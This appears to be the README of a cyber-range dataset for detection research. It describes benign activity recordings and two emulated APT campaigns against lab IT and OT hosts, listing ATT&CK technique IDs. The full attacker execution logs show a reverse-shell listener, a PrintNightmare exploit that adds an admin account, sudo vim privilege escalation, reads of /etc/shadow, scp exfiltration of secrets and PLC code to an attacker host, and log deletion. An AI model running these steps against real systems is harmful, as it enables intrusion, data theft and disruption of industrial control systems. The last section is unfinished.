# Cyberrange Dataset

## Benign Behaviour

Dataset folder name: 20-11-2024-15-30

Involved Hosts:
    - OT-Linux-PLC  10.0.2.17 (auditd not set up)
    - OT-Linux-HMI  10.0.2.16 (auditd not set up)
    - OT-Win-PC-1   10.0.2.15
    - IT-Win-Share  10.0.1.20, 10.0.2.20
    - IT-Win-PC-1   10.0.1.15 
    - IT-Linux-PC-1 10.0.1.16 (auditd not set up)
   
Duration: ~30 Min
Starting Time: ~ 1732113007.322 (Wednesday, November 20, 2024 3:30:07.322 PM GMT+01:00, IT-Linux-PC-1)
End-Time: ~ 1732114674.919 (Wednesday, November 20, 2024 3:57:54.919 PM GMT+01:00, IT-Linux-PC-1)
                


Activity:
    - IT-Win-PC-1
        - Office applications
        - Webbrowsing
        - YouTube playback
    - IT-Linux-PC-1
        - create files
        - try to create file in documents folder (permission denied)
        - create and edit text files in home directory
    - OT-Win-PC-1
        - try to ssh to OT-Linux-PLC and OT-Linux-HMI
    - OT-Linux-{PLC,HMI}
        - edit sshd config
        - ssh from proxy
        - lookup service status of modbus services
        - manually start hmi and plc binaries
   

   
## Benign Behaviour 2

Dataset folder name: 05-12-2024-11-01

Involved Hosts:
    - OT-Linux-PLC  10.0.2.17 
    - OT-Linux-HMI  10.0.2.16 
    - OT-Win-PC-1   10.0.2.15
    - IT-Win-Share  10.0.1.20, 10.0.2.20
    - IT-Win-PC-1   10.0.1.15 
    - IT-Linux-PC-1 10.0.1.16 
   
Duration: ~ 30 Min
Starting Time: 11:00 cet
End-Time: ~ 11:30 cet
                


Activity:
    - check auditd status on all linux devices
    - IT-Win-PC-1
        - Office applications
        - Webbrowsing
        - YouTube playback
    - IT-Linux-PC-1
        - create files
        - curl heise.de
        - ssh to PLC and HMI
        - create and edit text files in home directory
    - OT-Linux-{PLC,HMI}
        - edit sshd config
        - ssh from proxy for sshd config, ssh from IT-Linux-PC-1 for code stuff
        - lookup service status of modbus services
        - manually start hmi and plc binaries   
   
   
   
## Example APT Campaign

Dataset folder name: 23-11-2024-15-57

Involved Hosts:
    - OT-Linux-PLC  10.0.2.17 (auditd not set up)
    - OT-Linux-HMI  10.0.2.16 (auditd not set up)
    - OT-Win-PC-1   10.0.2.15 (record crashed)
    - IT-Win-Share  10.0.1.20, 10.0.2.20
    - IT-Win-PC-1   10.0.1.15
    - IT-Linux-PC-1 10.0.1.16 (auditd not set up)
    - APT-Outside-Attacker (not recorded)  10.0.4.97, 10.1.3.165
    
Duration: ~ 2h
Starting Time: ca 15:58 gmt+1
End Time: ca 17:47 gmt+1

Activity: 
    This is a sample APT campaign created to demonstrate the working behaviour of our cyberrange. It includes Windows and Linux hosts, features reconnaisance, privilege escalations, exfiltrations, lateral movement and impact. 
    There were some problems with this execution however which led to a second execution of this attack campaign.
    
TTPs (in order of execution):
    - IT-Win-PC-1
    - T1204.002 - User Execution: Malicious File   
    - T1096, T1564.004, T1132, T1105
    - T1497.001, T1082, T1120, T1033, T1016, T1057, T1083    
    - T1060, T1547.001
    - T1140, T1086, T1059.001, T1071
    
    - T1033
    - T1082
    - T1083 (x5)
    - T1087.001 (x3)
    - T1135/T1018
    - T1016 (x3)
    - T1049
    - T1016
    - T1105, T1059.001
    - T1046, T1595.001, T1590.005
    - T1083
    - T1059.001
    - T1059.001, T1078, T1136.001
    - T1059.001, T1078
    
    - T1033
    - T1083
    - T1552.001, T1083
    - T1021.004
    - T1021.004, T1041
    - T1571, T1021.004
 
    - IT-Linux-PC-1
    - T1033
    - T1082 (x4)
    - T1518 (x2)
    - T1083 (x4)
    - T1087.001, T1201
    - T1046, T1595.001, T1590.005, T1046
    - T1021.004, T1041
    - T1046, T1595.001, T1590.005, T1595.002
    - T1548.003

    - T1033
    - T1083 (x2)
    - T1021.004, T1041
    - T1021.004
    
    - IT-Win-Share
    - T1083
    - T1059.001
    - T1033
    - T1083 (x5)
    - T1021.004, T1041
    - T1105, T1059.001
    - T1046, T1595.001, T1590.005
    - T1046, T1595.001, T1590.005
    - T1571, T1021.004
    
    - OT-Linux-PLC
    - T1083
    - T1021.004, T1041

 
execution log:
```
┌──(debian㉿APT-Outside-Attacker)-[~]
└─$ stty raw -echo; (stty size; cat) | nc -lvnp 8000
listening on [any] 8000 ...

User TestAdmin executes malicious file

-->

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\TestAdmin\Desktop> 

whoami
systeminfo
type %userprofile%
cat (Get-PSReadlineOption).HistorySavePath | sls passw
ls
cd ..
ls
cd .\Documents\
ls
net user
net users
net localgroup
net view
ifconfig
ipconfig
ipconfig /all
netstat -ano
route print
cd ..
Invoke-WebRequest 'https://raw.githubusercontent.com/JohnHammond/CVE-2021-34527/refs/heads/master/CVE-2021-34527.ps1' -OutFile .\CVE-2021-34527.ps1
nmap -A 10.0.1.0/24
ls
Import-Module .\CVE-2021-34527.ps1
Invoke-Nightmare 
$user = "adm1n"
$pw = "P@ssw0rd"
$password = $pw | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $user,$password 
New-PSSession -Credential $cred | Enter-PSSession

-->

[localhost]: PS C:\Users\adm1n\Documents> whoami
cd C:\Users\TestAdmin\Documents\
ls
Copy-Item .\pw.txt C:\Users\TestAdmin\pw.txt
type .\pw.txt
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password pw.txt debian@10.1.3.165:/home/debian/
exit
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password pw.txt debian@10.1.3.165:/home/debian/
ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password ubuntu@10.0.1.16 -p 666

-->

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-164-generic x86_64) 

whoami
(cat /proc/version || uname -a ) 2>/dev/null
echo $PATH
cat /proc/version
uname -a
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
sudo -V
ls
cd Documents/
ls
cat secret.txt 
ls -lah 
sudo -l
nmap -A -p- -sV -sC -oN nmap.txt 10.0.1.0/25
cd ..
nmap -A -p- -sV -sC -oN nmap.txt 10.0.1.0/25
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password nmap.txt debian@10.1.3.165:/home/debian/
nmap -Pn --script vuln 10.0.1.20
sudo vim -c '!sh'

-->

:!sh
# whoami
ls 
cd Documents 
ls 
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password secret.txt debian@10.1.3.165:/home/debian 
ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password TestAdmin@10.0.1.20 -p 666
ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password TestAdmin@10.0.1.20

-->

:!sh
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

ls
powershell 
whoami
ls
cd ..
cd ..
ls
cd .\shares\
ls
cd .\company\
ls
type .\confidential_report.txt
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password .\confidential_report.txt debian@10.1.3.165:/home/debian/
cd ..
cd ..
Invoke-WebRequest 'https://raw.githubusercontent.com/BornToBeRoot/PowerShell_IPv4NetworkScanner/refs/heads/main/Scripts/IPv4NetworkScan.ps1' -OutFile scan.ps1 
.\scan.ps1 -IPv4Address 10.0.2.0 -CIDR 24
nmap -A 10.0.2.0/24
ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password debian@10.0.2.17 -p 80

--> 

Linux OT-Linux-PLC 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

ls
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password plc debian@10.1.3.165:/home/debian/
```



## Example APT Campaign 2

Dataset folder name: 29-11-2024-15-01

Involved Hosts:
    - OT-Linux-PLC  10.0.2.17
    - OT-Linux-HMI  10.0.2.16 (record crashed)
    - OT-Win-PC-1   10.0.2.15 
    - IT-Win-Share  10.0.1.20, 10.0.2.20
    - IT-Win-PC-1   10.0.1.15
    - IT-Linux-PC-1 10.0.1.16
    - APT-Outside-Attacker (not recorded)  10.0.4.97, 10.1.3.165

Duration: ~ 1 h
Starting Time: ~ 15:04 cet 
End Time: ~ 16:01 cet

Activity: 
  The first APT campaign was repeated due to auditd on all linux host not being properly set up. Therefore, the campaign was re-run with the original exec log from campaign 1, except some small changes. In Campaign 1, TestAdmin executed the malicious file. In campaign 2, TestUser did execute it. But TestUser does not have the permission to execute nmap, so the network scan script used in IT-Win-Share was downloaded and executed instead. Also this campaign was executed purpusefully faster to provide a contrast in the windows logs. Also, /etc/passwd and /etc/shadow are accessed on IT-Linux-PC-1 and on OT-Linux-PLC, some files are exfiltrated and deleted on device afterwards.
    
  
TTPs (in order of execution):    
    - IT-Win-PC-1
    - T1204.002 - User Execution: Malicious File   
    - T1096, T1564.004, T1132, T1105
    - T1497.001, T1082, T1120, T1033, T1016, T1057, T1083    
    - T1060, T1547.001
    - T1140, T1086, T1059.001, T1071
    
    - T1033
    - T1082
    - T1083 (x5)
    - T1087.001 (x3)
    - T1135/T1018
    - T1016 (x3)
    - T1049
    - T1016
    - T1105, T1059.001
    - T1046, T1595.001, T1590.005
    - T1083
    - T1059.001
    - T1059.001, T1078, T1136.001
    - T1059.001, T1078
    
    - T1033
    - T1083
    - T1552.001, T1083
    - T1021.004
    - T1021.004, T1041
    - T1571, T1021.004
 
    - IT-Linux-PC-1
    - T1033
    - T1082 (x4)
    - T1518 (x2)
    - T1083 (x4)
    - T1087.001, T1201
    - T1046, T1595.001, T1590.005, T1046
    - T1021.004, T1041
    - T1046, T1595.001, T1590.005, T1595.002
    - T1548.003

    - T1033
    - T1083 (x2)
    - T1021.004, T1041
    - T1021.004
    
    - IT-Win-Share
    - T1083
    - T1059.001
    - T1033
    - T1083 (x5)
    - T1021.004, T1041
    - T1105, T1059.001
    - T1046, T1595.001, T1590.005
    - T1046, T1595.001, T1590.005
    - T1571, T1021.004
    
    - OT-Linux-PLC
    - T1083
    - T1021.004, T1041
    
execution log:
```
┌──(debian㉿APT-Outside-Attacker)-[~]
└─$ stty raw -echo; (stty size; cat) | nc -lvnp 8000
listening on [any] 8000 ...

User TestUser executes malicious file

-->

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\TestUser\Desktop> 

whoami
systeminfo
type %userprofile%
cat (Get-PSReadlineOption).HistorySavePath | sls passw
ls
cd ..
ls
cd .\Documents\
ls
net user
net users
net localgroup
net view
ifconfig
ipconfig
ipconfig /all
netstat -ano
route print
cd ..
Invoke-WebRequest 'https://raw.githubusercontent.com/JohnHammond/CVE-2021-34527/refs/heads/master/CVE-2021-34527.ps1' -OutFile .\CVE-2021-34527.ps1
Invoke-WebRequest 'https://raw.githubusercontent.com/BornToBeRoot/PowerShell_IPv4NetworkScanner/refs/heads/main/Scripts/IPv4NetworkScan.ps1' -OutFile scan.ps1 
.\scan.ps1 -IPv4Address 10.0.1.0 -CIDR 24
ping 10.0.1.16
ls
Import-Module .\CVE-2021-34527.ps1
Invoke-Nightmare 
$user = "adm1n"
$pw = "P@ssw0rd"
$password = $pw | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $user,$password 
New-PSSession -Credential $cred | Enter-PSSession

-->

[localhost]: PS C:\Users\adm1n\Documents> whoami
cd C:\Users\TestAdmin\Documents\
ls
Copy-Item .\pw.txt C:\Users\TestUser\pw.txt
type .\pw.txt
exit
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password pw.txt debian@10.1.3.165:/home/debian/
ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password ubuntu@10.0.1.16 -p 666

-->

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-164-generic x86_64) 

whoami
(cat /proc/version || uname -a ) 2>/dev/null
echo $PATH
cat /proc/version
uname -a
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
sudo -V
ls
cd Documents/
ls
cat secret.txt 
ls -lah 
sudo -l
nmap -A -p- -sV -sC -oN nmap.txt 10.0.1.0/25
cd ..
nmap -A -p- -sV -sC -oN nmap.txt 10.0.1.0/25
cat /etc/passwd
cat /etc/shadow
rm /home/ubuntu/tshark/IT-Linux-PC-1.pcap.tar.gz
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password nmap.txt debian@10.1.3.165:/home/debian/
nmap -Pn --script vuln 10.0.1.20
sudo vim -c '!sh'

-->

:!sh
# whoami
cat /etc/passwd
cat /etc/shadow
ls 
cd Documents 
ls 
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password secret.txt debian@10.1.3.165:/home/debian 
ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password TestAdmin@10.0.1.20 -p 666
ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password TestAdmin@10.0.1.20

-->

:!sh
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

ls
powershell 
whoami
ls
cd ..
cd ..
ls
cd .\shares\
ls
cd .\company\
ls
type .\confidential_report.txt
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password .\confidential_report.txt debian@10.1.3.165:/home/debian/
cd ..
cd ..
Invoke-WebRequest 'https://raw.githubusercontent.com/BornToBeRoot/PowerShell_IPv4NetworkScanner/refs/heads/main/Scripts/IPv4NetworkScan.ps1' -OutFile scan.ps1 
nmap -A 10.0.2.0/24
ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password debian@10.0.2.17 -p 80

--> 

Linux OT-Linux-PLC 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

ls
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password plc debian@10.1.3.165:/home/debian/
scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password plc.c debian@10.1.3.165:/home/debian/
rm plc 
rm plc.c 
sudo service plcd stop
```   






## Single-Host Attack

Dataset folder name: 

Involved Hosts:
    - IT-Win-PC-1
    - APT-Outside-Attacker (not recorded)

Start Time:    
Duration:
End Time: 

Activity:
    - User TestUser clicks on malicious link file which spawns an implant for APT-Outside-Attacker PoshC2 Server
    - Attacker gets access to powershell, performs local and network reconnaisance and 

execution log:
```
```



    
